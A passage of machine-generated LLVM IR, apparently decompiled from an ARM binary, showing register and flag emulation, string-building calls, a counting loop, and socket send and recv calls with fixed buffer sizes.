  %v2_975c = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_9768 = add i32 %v2_975c, %stack_var_-20856.0.ph
  store i32 %v2_9768, i32* @r0, align 4
  %v2_976c = inttoptr i32 %v2_9768 to i8*
  %v3_976c = call i32 @function_12d5c(i8* %v2_976c, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9774 = call i32 @function_12280(i32 41)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_977c = call i32 @function_12d34(i8* %v1_9610)
  %v0_9780 = load i32, i32* @r5, align 4
  store i32 %v0_9780, i32* %r1.global-to-local, align 4
  store i32 %v2_977c, i32* @r4, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_978c = inttoptr i32 %v0_9780 to i32*
  %v3_978c = call i32 @function_1219c(i32 41, i32* %v2_978c)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_978c, i32* %r1.global-to-local, align 4
  %v1_9798 = load i32, i32* @r4, align 4
  %v2_9798 = add i32 %v1_9798, %stack_var_-20856.0.ph
  store i32 %v2_9798, i32* @r0, align 4
  %v2_979c = inttoptr i32 %v2_9798 to i8*
  %v3_979c = call i32 @function_12d5c(i8* %v2_979c, i32 %v3_978c)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_97a4 = call i32 @function_121c8(i32 41)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97ac = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_97b8 = add i32 %v2_97ac, %stack_var_-20856.0.ph
  store i32 %v2_97b8, i32* @r0, align 4
  %v2_97bc = inttoptr i32 %v2_97b8 to i8*
  %v3_97bc = call i32 @function_12d5c(i8* %v2_97bc, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 %v3_97bc, i32* %r0.global-to-local, align 4
  store i32 %v6_8ed0, i32* %r1.global-to-local, align 4
  %v1_97c4 = load i32, i32* @r5, align 4
  %v2_97c4 = sub i32 %v6_8ed0, %v1_97c4
  %v3_97c4 = icmp uge i32 %v6_8ed0, %v1_97c4
  store i1 %v3_97c4, i1* %cpsr_c.global-to-local, align 1
  %v4_97c4 = xor i32 %v1_97c4, %v6_8ed0
  %v5_97c4 = xor i32 %v2_97c4, %v6_8ed0
  %v6_97c4 = and i32 %v5_97c4, %v4_97c4
  %v7_97c4 = icmp slt i32 %v6_97c4, 0
  store i1 %v7_97c4, i1* %cpsr_v.global-to-local, align 1
  %v8_97c4 = icmp slt i32 %v2_97c4, 0
  store i1 %v8_97c4, i1* %cpsr_n.global-to-local, align 1
  %v9_97c4 = icmp eq i32 %v6_8ed0, %v1_97c4
  store i1 %v9_97c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_97c4, label %dec_label_pc_989c, label %dec_label_pc_97cc

dec_label_pc_97cc:                                ; preds = %dec_label_pc_95dc
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_97d0 = call i32 @function_12280(i32 42)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97d8 = call i32 @function_12d34(i8* %v1_9610)
  %v0_97dc = load i32, i32* @r5, align 4
  store i32 %v0_97dc, i32* %r1.global-to-local, align 4
  store i32 %v2_97d8, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_97e8 = inttoptr i32 %v0_97dc to i32*
  %v3_97e8 = call i32 @function_1219c(i32 42, i32* %v2_97e8)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_97e8, i32* %r1.global-to-local, align 4
  %v1_97f4 = load i32, i32* @r4, align 4
  %v2_97f4 = add i32 %v1_97f4, %stack_var_-20856.0.ph
  store i32 %v2_97f4, i32* @r0, align 4
  %v2_97f8 = inttoptr i32 %v2_97f4 to i8*
  %v3_97f8 = call i32 @function_12d5c(i8* %v2_97f8, i32 %v3_97e8)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_9800 = call i32 @function_121c8(i32 42)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9808 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_9814 = add i32 %v2_9808, %stack_var_-20856.0.ph
  store i32 %v2_9814, i32* @r0, align 4
  %v2_9818 = inttoptr i32 %v2_9814 to i8*
  %v3_9818 = call i32 @function_12d5c(i8* %v2_9818, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9820 = call i32 @function_12d34(i8* %v1_9610)
  %v0_9824 = load i32, i32* @r5, align 4
  store i32 %v0_9824, i32* %r1.global-to-local, align 4
  store i32 %v2_9820, i32* %r4.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_9830 = inttoptr i32 %v0_9824 to i32*
  %v3_9830 = call i32 @function_1219c(i32 47, i32* %v2_9830)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_9830, i32* %r1.global-to-local, align 4
  %v2_983c = add i32 %v2_9820, %stack_var_-20856.0.ph
  store i32 %v2_983c, i32* @r0, align 4
  %v2_9840 = inttoptr i32 %v2_983c to i8*
  %v3_9840 = call i32 @function_12d5c(i8* %v2_9840, i32 %v3_9830)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9848 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1368c.80 to i32), i32* %r1.global-to-local, align 4
  %v2_9854 = add i32 %v2_9848, %stack_var_-20856.0.ph
  store i32 %v2_9854, i32* @r0, align 4
  %v2_9858 = inttoptr i32 %v2_9854 to i8*
  %v3_9858 = call i32 @function_12d5c(i8* %v2_9858, i32 ptrtoint (i32* @global_var_1368c.80 to i32))
  store i32 %v6_8ed0, i32* %r0.global-to-local, align 4
  %v2_9860 = call i32 @function_12d34(i8* %v1_9860)
  store i32 %v2_9860, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_986c = call i32 @function_12d34(i8* %v1_9610)
  %v2_9874 = add i32 %v2_986c, %stack_var_-20856.0.ph
  store i32 %v2_9874, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_987c = load i32, i32* @r4, align 4
  store i32 %v0_987c, i32* %r0.global-to-local, align 4
  %v3_9880 = trunc i32 %v0_987c to i8
  %v4_9880 = call i32 @function_13228(i8 %v3_9880, i32 10, i32 %v2_9874)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9888 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_9894 = add i32 %v2_9888, %stack_var_-20856.0.ph
  store i32 %v2_9894, i32* @r0, align 4
  %v2_9898 = inttoptr i32 %v2_9894 to i8*
  %v3_9898 = call i32 @function_12d5c(i8* %v2_9898, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 %v3_9898, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_989c

dec_label_pc_989c:                                ; preds = %dec_label_pc_95dc, %dec_label_pc_97cc
  %v0_989c = load i32, i32* @r6, align 4
  %v1_989c = add i32 %v0_989c, 37
  %v2_989c = inttoptr i32 %v1_989c to i32*
  %v3_989c = load i32, i32* %v2_989c, align 4
  store i32 %v3_989c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_98a0 = icmp slt i32 %v3_989c, 0
  store i1 %v1_98a0, i1* %cpsr_n.global-to-local, align 1
  %v2_98a0 = icmp eq i32 %v3_989c, 0
  store i1 %v2_98a0, i1* %cpsr_z.global-to-local, align 1
  %tmp214 = icmp slt i32 %v3_989c, 1
  br i1 %tmp214, label %dec_label_pc_9948, label %dec_label_pc_98a8

dec_label_pc_98a8:                                ; preds = %dec_label_pc_989c
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98ac = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1369c.88 to i32), i32* %r1.global-to-local, align 4
  %v2_98b8 = add i32 %v2_98ac, %stack_var_-20856.0.ph
  store i32 %v2_98b8, i32* @r0, align 4
  %v3_98bc = inttoptr i32 %v2_98b8 to i8*
  %v4_98bc = call i32 @function_12d5c(i8* %v3_98bc, i32 ptrtoint ([9 x i8]* @global_var_1369c.88 to i32))
  store i32 %v4_98bc, i32* %r0.global-to-local, align 4
  %v0_98c0 = load i32, i32* @r6, align 4
  %v1_98c0 = add i32 %v0_98c0, 37
  %v2_98c0 = inttoptr i32 %v1_98c0 to i32*
  %v3_98c0 = load i32, i32* %v2_98c0, align 4
  store i32 %v3_98c0, i32* %r3.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_98c8 = icmp slt i32 %v3_98c0, 0
  store i1 %v1_98c8, i1* %cpsr_n.global-to-local, align 1
  %v2_98c8 = icmp eq i32 %v3_98c0, 0
  store i1 %v2_98c8, i1* %cpsr_z.global-to-local, align 1
  %v0_98cc = load i32, i32* @r5, align 4
  store i32 %v0_98cc, i32* %stack_var_-40, align 4
  %tmp215 = icmp slt i32 %v3_98c0, 1
  br i1 %tmp215, label %dec_label_pc_9930, label %dec_label_pc_98d4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98a8, %dec_label_pc_98d4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98d8 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  %v3_98e0 = load i32, i32* %stack_var_-40, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v1_98e8 = and i32 %v3_98e0, 33554432
  %v2_98e8 = icmp ne i32 %v1_98e8, 0
  store i1 %v2_98e8, i1* %cpsr_c.global-to-local, align 1
  %v3_98e8 = mul i32 %v3_98e0, 128
  %v1_98ec = add i32 %v3_98e8, 1472
  %v2_98f0 = add i32 %v2_98d8, %stack_var_-20856.0.ph
  store i32 %v2_98f0, i32* @r0, align 4
  %v0_98f4 = load i32, i32* @r7, align 4
  %v2_98f4 = add i32 %v1_98ec, %v0_98f4
  store i32 %v2_98f4, i32* %r1.global-to-local, align 4
  %v2_98f8 = inttoptr i32 %v2_98f0 to i8*
  %v3_98f8 = call i32 @function_12d5c(i8* %v2_98f8, i32 %v2_98f4)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9900 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_136a8.90 to i32), i32* %r1.global-to-local, align 4
  %v2_990c = add i32 %v2_9900, %stack_var_-20856.0.ph
  store i32 %v2_990c, i32* @r0, align 4
  %v3_9910 = inttoptr i32 %v2_990c to i8*
  %v4_9910 = call i32 @function_12d5c(i8* %v3_9910, i32 ptrtoint ([3 x i8]* @global_var_136a8.90 to i32))
  store i32 %v4_9910, i32* %r0.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  %v3_9918 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9918, i32* %r3.global-to-local, align 4
  %v0_991c = load i32, i32* @r6, align 4
  %v1_991c = add i32 %v0_991c, 37
  %v2_991c = inttoptr i32 %v1_991c to i32*
  %v3_991c = load i32, i32* %v2_991c, align 4
  store i32 %v3_991c, i32* %r2.global-to-local, align 4
  %v1_9920 = add i32 %v3_9918, 1
  store i32 %v1_9920, i32* %ip.global-to-local, align 4
  %v2_9924 = sub i32 %v3_991c, %v1_9920
  %v3_9924 = icmp uge i32 %v3_991c, %v1_9920
  store i1 %v3_9924, i1* %cpsr_c.global-to-local, align 1
  %v4_9924 = xor i32 %v3_991c, %v1_9920
  %v5_9924 = xor i32 %v2_9924, %v3_991c
  %v6_9924 = and i32 %v5_9924, %v4_9924
  %v7_9924 = icmp slt i32 %v6_9924, 0
  store i1 %v7_9924, i1* %cpsr_v.global-to-local, align 1
  %v8_9924 = icmp slt i32 %v2_9924, 0
  store i1 %v8_9924, i1* %cpsr_n.global-to-local, align 1
  %v9_9924 = icmp eq i32 %v3_991c, %v1_9920
  store i1 %v9_9924, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9920, i32* %stack_var_-40, align 4
  %v8_992c = icmp sgt i32 %v3_991c, %v1_9920
  br i1 %v8_992c, label %dec_label_pc_98d4, label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98a8
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9934 = call i32 @function_12d34(i8* %v1_9610)
  %v2_993c = add i32 %v2_9934, %stack_var_-20856.0.ph
  store i32 %v2_993c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_9944 = inttoptr i32 %v2_993c to i8*
  %v3_9944 = call i32 @function_12d5c(i8* %v2_9944, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 %v3_9944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9948

dec_label_pc_9948:                                ; preds = %dec_label_pc_989c, %dec_label_pc_9930
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_994c = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_9958 = add i32 %v2_994c, %stack_var_-20856.0.ph
  store i32 %v2_9958, i32* @r0, align 4
  %v2_995c = inttoptr i32 %v2_9958 to i8*
  %v3_995c = call i32 @function_12d5c(i8* %v2_995c, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 %v3_995c, i32* %r0.global-to-local, align 4
  store i32 %v6_8ed0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_9964, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_9964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9964, label %dec_label_pc_9984, label %dec_label_pc_996c

dec_label_pc_996c:                                ; preds = %dec_label_pc_9948
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9970 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8ed0, i32* %r1.global-to-local, align 4
  %v2_997c = add i32 %v2_9970, %stack_var_-20856.0.ph
  store i32 %v2_997c, i32* @r0, align 4
  %v2_9980 = inttoptr i32 %v2_997c to i8*
  %v3_9980 = call i32 @function_12d5c(i8* %v2_9980, i32 %v6_8ed0)
  store i32 %v3_9980, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9948, %dec_label_pc_996c
  %v0_9984 = load i32, i32* @r7, align 4
  %v1_9984 = add i32 %v0_9984, 1440
  store i32 %v1_9984, i32* %r4.global-to-local, align 4
  %v0_9988 = load i32, i32* @r6, align 4
  store i32 %v0_9988, i32* %r0.global-to-local, align 4
  store i32 %v1_9984, i32* %r1.global-to-local, align 4
  %v2_9990 = inttoptr i32 %v0_9988 to i8*
  %v3_9990 = call i32 @function_13114(i8* %v2_9990, i32 %v1_9984)
  store i32 %v3_9990, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9994 = icmp slt i32 %v3_9990, 0
  store i1 %v1_9994, i1* %cpsr_n.global-to-local, align 1
  %v2_9994 = icmp eq i32 %v3_9990, 0
  store i1 %v2_9994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9994, label %dec_label_pc_a2dc, label %dec_label_pc_999c

dec_label_pc_999c:                                ; preds = %dec_label_pc_9984, %dec_label_pc_a2dc
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_99a0 = load i32, i32* @r6, align 4
  %v1_99a0 = add i32 %v0_99a0, -1431
  %v2_99a0 = inttoptr i32 %v1_99a0 to i32*
  %v3_99a0 = load i32, i32* %v2_99a0, align 4
  store i32 %v3_99a0, i32* @r4, align 4
  %v2_99a4 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_99a4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_99b4 = load i32, i32* @r4, align 4
  store i32 %v0_99b4, i32* %r0.global-to-local, align 4
  %v5_99b8 = call i32 @send(i32 %v0_99b4, i32* %v4_99b8, i32 %v2_99a4, i32 16384)
  store i32 %v5_99b8, i32* %r0.global-to-local, align 4
  %v0_99bc = load i32, i32* @r6, align 4
  %v1_99bc = add i32 %v0_99bc, -1431
  %v2_99bc = inttoptr i32 %v1_99bc to i32*
  %v3_99bc = load i32, i32* %v2_99bc, align 4
  store i32 %v3_99bc, i32* %r0.global-to-local, align 4
  %v3_99c4 = udiv i32 %v3_99bc, 32
  %v3_99c8 = mul nuw nsw i32 %v3_99c4, 4
  store i32 %v2_9418, i32* %lr.global-to-local, align 4
  %v2_99d0 = add i32 %v3_99c8, %v2_9418
  store i32 %v2_99d0, i32* %r3.global-to-local, align 4
  %v1_99d4 = add i32 %v2_99d0, -164
  %v2_99d4 = inttoptr i32 %v1_99d4 to i32*
  %v3_99d4 = load i32, i32* %v2_99d4, align 4
  %v1_99d8 = urem i32 %v3_99bc, 32
  %v1_99dc = load i32, i32* %fp.global-to-local, align 4
  %v7_99dc = shl i32 %v1_99dc, %v1_99d8
  %v8_99dc = or i32 %v7_99dc, %v3_99d4
  store i32 %v8_99dc, i32* %r2.global-to-local, align 4
  %v0_99e0 = load i32, i32* @sl, align 4
  %v2_99e0 = sub i32 %v0_99e0, %v3_99bc
  %v3_99e0 = icmp uge i32 %v0_99e0, %v3_99bc
  store i1 %v3_99e0, i1* %cpsr_c.global-to-local, align 1
  %v4_99e0 = xor i32 %v0_99e0, %v3_99bc
  %v5_99e0 = xor i32 %v2_99e0, %v0_99e0
  %v6_99e0 = and i32 %v5_99e0, %v4_99e0
  %v7_99e0 = icmp slt i32 %v6_99e0, 0
  store i1 %v7_99e0, i1* %cpsr_v.global-to-local, align 1
  %v8_99e0 = icmp slt i32 %v2_99e0, 0
  store i1 %v8_99e0, i1* %cpsr_n.global-to-local, align 1
  %v9_99e0 = icmp eq i32 %v0_99e0, %v3_99bc
  store i1 %v9_99e0, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_99dc, i32* %v2_99d4, align 4
  %v0_99ec = load i32, i32* %sb.global-to-local, align 4
  %v1_99ec = load i32, i32* @r6, align 4
  %v2_99ec = add i32 %v1_99ec, -1419
  %v3_99ec = inttoptr i32 %v2_99ec to i32*
  store i32 %v0_99ec, i32* %v3_99ec, align 4
  %v0_99f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_99f0 = trunc i32 %v0_99f0 to i8
  %v2_99f0 = load i32, i32* @r6, align 4
  %v3_99f0 = add i32 %v2_99f0, -1427
  %v4_99f0 = inttoptr i32 %v3_99f0 to i8*
  store i8 %v1_99f0, i8* %v4_99f0, align 1
  %v0_99f4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_99f4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_99f4 = xor i1 %v0_99f4, %v1_99f4
  br i1 %v2_99f4, label %dec_label_pc_99f8, label %dec_label_pc_9300

dec_label_pc_99f8:                                ; preds = %dec_label_pc_999c
  %v0_99f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_99f8 = add i32 %v0_99f8, 1
  store i32 %v1_99f8, i32* @sl, align 4
  br label %dec_label_pc_943c

dec_label_pc_9a00:                                ; preds = %dec_label_pc_92d8
  %v1_9a00 = add i32 %v3_95d0, -1431
  %v2_9a00 = inttoptr i32 %v1_9a00 to i32*
  %v3_9a00 = load i32, i32* %v2_9a00, align 4
  store i32 %v3_9a00, i32* %r0.global-to-local, align 4
  %v3_9a08 = udiv i32 %v3_9a00, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9a0c = mul nuw nsw i32 %v3_9a08, 4
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v2_9a14 = add i32 %v3_9a0c, %v2_9418
  store i32 %v2_9a14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9a18

dec_label_pc_9a18:                                ; preds = %.thread25, %.thread36, %dec_label_pc_9a00
  %v1_9a24 = phi i32 [ %v4_92bc, %.thread36 ], [ %v4_929c, %.thread25 ], [ %v3_9a00, %dec_label_pc_9a00 ]
  %v1_9a28 = phi i32 [ %v3_92d0, %.thread36 ], [ %v3_92b0, %.thread25 ], [ %v2_9a14, %dec_label_pc_9a00 ]
  %v1_9a18 = add i32 %v1_9a28, -164
  %v2_9a18 = inttoptr i32 %v1_9a18 to i32*
  %v3_9a18 = load i32, i32* %v2_9a18, align 4
  %v1_9a1c = urem i32 %v1_9a24, 32
  store i32 %v1_9a1c, i32* %r1.global-to-local, align 4
  %v1_9a20 = load i32, i32* %fp.global-to-local, align 4
  %v7_9a20 = shl i32 %v1_9a20, %v1_9a1c
  %v8_9a20 = or i32 %v7_9a20, %v3_9a18
  store i32 %v8_9a20, i32* %r2.global-to-local, align 4
  %v0_9a24 = load i32, i32* @sl, align 4
  %v2_9a24 = sub i32 %v0_9a24, %v1_9a24
  %v3_9a24 = icmp uge i32 %v0_9a24, %v1_9a24
  store i1 %v3_9a24, i1* %cpsr_c.global-to-local, align 1
  %v4_9a24 = xor i32 %v0_9a24, %v1_9a24
  %v5_9a24 = xor i32 %v2_9a24, %v0_9a24
  %v6_9a24 = and i32 %v5_9a24, %v4_9a24
  %v7_9a24 = icmp slt i32 %v6_9a24, 0
  store i1 %v7_9a24, i1* %cpsr_v.global-to-local, align 1
  %v8_9a24 = icmp slt i32 %v2_9a24, 0
  store i1 %v8_9a24, i1* %cpsr_n.global-to-local, align 1
  %v9_9a24 = icmp eq i32 %v0_9a24, %v1_9a24
  store i1 %v9_9a24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_9a20, i32* %v2_9a18, align 4
  %v2_9a2c = xor i1 %v8_9a24, %v7_9a24
  br i1 %v2_9a2c, label %dec_label_pc_9a30, label %dec_label_pc_9300

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a18
  %v0_9a30 = load i32, i32* %r0.global-to-local, align 4
  %v1_9a30 = add i32 %v0_9a30, 1
  store i32 %v1_9a30, i32* @sl, align 4
  br label %dec_label_pc_943c

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9288
  %v1_9a38 = add i32 %v3_95d0, -1423
  %v2_9a38 = inttoptr i32 %v1_9a38 to i32*
  %v3_9a38 = load i32, i32* %v2_9a38, align 4
  %v1_9a3c = load i32, i32* %sb.global-to-local, align 4
  %v2_9a3c = sub i32 %v1_9a3c, %v3_9a38
  store i32 %v2_9a3c, i32* %r3.global-to-local, align 4
  %v1_9a40 = add i32 %v2_9a3c, -30
  %v2_9a40 = icmp ugt i32 %v2_9a3c, 29
  store i1 %v2_9a40, i1* %cpsr_c.global-to-local, align 1
  %v3_9a40 = sub i32 29, %v2_9a3c
  %v4_9a40 = and i32 %v3_9a40, %v2_9a3c
  %v5_9a40 = icmp slt i32 %v4_9a40, 0
  store i1 %v5_9a40, i1* %cpsr_v.global-to-local, align 1
  %v6_9a40 = icmp slt i32 %v1_9a40, 0
  store i1 %v6_9a40, i1* %cpsr_n.global-to-local, align 1
  %v7_9a40 = icmp eq i32 %v2_9a3c, 30
  store i1 %v7_9a40, i1* %cpsr_z.global-to-local, align 1
  %v2_9a44 = xor i1 %v7_9a40, true
  %v3_9a44 = and i1 %v2_9a40, %v2_9a44
  br i1 %v3_9a44, label %dec_label_pc_92e8, label %dec_label_pc_9a48

dec_label_pc_9a48:                                ; preds = %dec_label_pc_9a38
  %v1_9a48 = add i32 %v3_95d0, -1431
  %v2_9a48 = inttoptr i32 %v1_9a48 to i32*
  %v3_9a48 = load i32, i32* %v2_9a48, align 4
  store i32 %v3_9a48, i32* %r0.global-to-local, align 4
  %v3_9a50 = udiv i32 %v3_9a48, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9a54 = mul nuw nsw i32 %v3_9a50, 4
  store i32 %v3_9a54, i32* %r3.global-to-local, align 4
  store i32 %v2_9418, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9420

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_94ec
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9aa8 = call i32 @function_12dd4(i32 %v2_8f50, i32 10240)
  store i32 %v2_9aa8, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9ab4 = load i32, i32* @r8, align 4
  %v1_9ab4 = add i32 %v0_9ab4, -1456
  %v2_9ab4 = inttoptr i32 %v1_9ab4 to i32*
  %v3_9ab4 = load i32, i32* %v2_9ab4, align 4
  store i32 %v3_9ab4, i32* %r0.global-to-local, align 4
  store i32 %v2_8f50, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v5_9ac0 = call i32 @recv(i32 %v3_9ab4, i32* nonnull %stack_var_-20809, i32 10240, i32 16386)
  store i32 %v5_9ac0, i32* %r0.global-to-local, align 4
  store i32 %v5_9ac0, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9ac8 = icmp slt i32 %v5_9ac0, 0
  store i1 %v1_9ac8, i1* %cpsr_n.global-to-local, align 1
  %v2_9ac8 = icmp eq i32 %v5_9ac0, 0
  store i1 %v2_9ac8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp216 = icmp slt i32 %v5_9ac0, 1
  br i1 %tmp216, label %dec_label_pc_a74c, label %dec_label_pc_9ad4

dec_label_pc_9ad4:                                ; preds = %dec_label_pc_9aa0
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  store i32 %v5_9ac0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_136ac.92 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9ae4 = call i32 @function_12df8(i32 %v2_8f50, i32 %v5_9ac0, i32 ptrtoint ([5 x i8]* @global_var_136ac.92 to i32), i32 4)
  store i32 %v5_9ae4, i32* %r0.global-to-local, align 4
  %v1_9ae8 = add i32 %v5_9ae4, 1
  %v2_9ae8 = icmp eq i32 %v5_9ae4, -1
  store i1 %v2_9ae8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ae8 = sub i32 0, %v5_9ae4
  %v4_9ae8 = and i32 %v1_9ae8, %v3_9ae8
  %v5_9ae8 = icmp slt i32 %v4_9ae8, 0
  store i1 %v5_9ae8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ae8 = icmp slt i32 %v1_9ae8, 0
  store i1 %v6_9ae8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ae8 = icmp eq i32 %v1_9ae8, 0
  store i1 %v7_9ae8, i1* %cpsr_z.global-to-local, align 1
  %v0_a5e4 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_9ae8, label %dec_label_pc_a5e4, label %dec_label_pc_9af0

dec_label_pc_9af0:                                ; preds = %dec_label_pc_9ad4, %dec_label_pc_a5e4
  store i32 ptrtoint ([5 x i8]* @global_var_136ac.92 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_a5e4, i32* %r1.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v5_9b00 = call i32 @function_12df8(i32 %v2_8f50, i32 %v0_a5e4, i32 ptrtoint ([5 x i8]* @global_var_136ac.92 to i32), i32 4)
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v2_9b0c = add i32 %v5_9b00, %v2_9418
  store i32 %v2_9b0c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_9b14 = load i32, i32* @r6, align 4
